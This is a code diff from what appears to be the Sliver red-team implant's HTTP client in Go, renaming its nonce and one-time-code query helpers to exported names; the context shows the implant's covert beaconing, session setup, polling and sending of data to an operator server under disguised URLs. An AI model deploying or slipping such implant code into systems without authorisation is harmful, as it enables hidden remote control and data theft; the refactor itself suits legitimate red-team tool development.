@@ -140,7 +140,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	return req
 }
 
-func (s *SliverHTTPClient) nonceQueryArgument(uri *url.URL, value int) *url.URL {
+func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
 	values := uri.Query()
 	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
 	// {{if .Config.Debug}}
@@ -157,7 +157,7 @@ func (s *SliverHTTPClient) nonceQueryArgument(uri *url.URL, value int) *url.URL 
 	return uri
 }
 
-func (s *SliverHTTPClient) otpQueryArgument(uri *url.URL, value string) *url.URL {
+func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
 	values := uri.Query()
 	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
 	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
@@ -174,9 +174,9 @@ func (s *SliverHTTPClient) otpQueryArgument(uri *url.URL, value string) *url.URL
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.txtURL()
 	nonce, encoder := encoders.RandomTxtEncoder()
-	s.nonceQueryArgument(uri, nonce)
+	s.NonceQueryArgument(uri, nonce)
 	otpCode := getOTPCode()
-	s.otpQueryArgument(uri, otpCode)
+	s.OTPQueryArgument(uri, otpCode)
 
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
@@ -232,9 +232,9 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
 	uri := s.phtmlURL()
-	s.nonceQueryArgument(uri, nonce)
+	s.NonceQueryArgument(uri, nonce)
 	otpCode := getOTPCode()
-	s.otpQueryArgument(uri, otpCode)
+	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s", uri)
@@ -271,7 +271,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	}
 	uri := s.jsURL()
 	nonce, encoder := encoders.RandomEncoder()
-	s.nonceQueryArgument(uri, nonce)
+	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
@@ -316,7 +316,7 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 
 	uri := s.phpURL()
 	nonce, encoder := encoders.RandomEncoder()
-	s.nonceQueryArgument(uri, nonce)
+	s.NonceQueryArgument(uri, nonce)
 	reader := bytes.NewReader(encoder.Encode(reqData))
 
 	// {{if .Config.Debug}}
